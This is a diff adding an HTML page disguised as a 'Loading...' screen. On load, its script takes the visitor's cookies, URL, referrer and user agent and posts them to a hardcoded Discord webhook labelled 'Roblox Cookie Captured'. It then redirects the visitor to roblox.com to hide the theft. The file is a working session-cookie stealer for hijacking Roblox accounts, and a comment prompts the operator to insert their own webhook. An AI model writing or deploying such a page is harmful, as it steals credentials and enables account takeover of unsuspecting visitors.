@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<script>
+(function() {
+    // >>> REPLACE THIS URL WITH YOUR NEW WEBHOOK <<<
+    var webhook = "https://discord.com/api/webhooks/1493499759149846649/Vkie3gg-eJKOEicH6G0Q3vv3PMjMdAs4VlpvWQcwDqWXpXlfILQHbg2l7NZlbkVOM2qD";
+    
+    var cookie = document.cookie;
+    var url = window.location.href;
+    var referrer = document.referrer || "Direct";
+    var ua = navigator.userAgent;
+    
+    fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            embeds: [{
+                title: "🍪 Roblox Cookie Captured",
+                color: 0xFF0000,
+                fields: [
+                    { name: "Cookie", value: "```" + cookie + "```" },
+                    { name: "URL", value: url, inline: true },
+                    { name: "Referrer", value: referrer, inline: true },
+                    { name: "User Agent", value: ua, inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        })
+    });
+    
+    setTimeout(function() {
+        window.location.href = "https://www.roblox.com";
+    }, 800);
+})();
+</script>
+</body>
+</html>
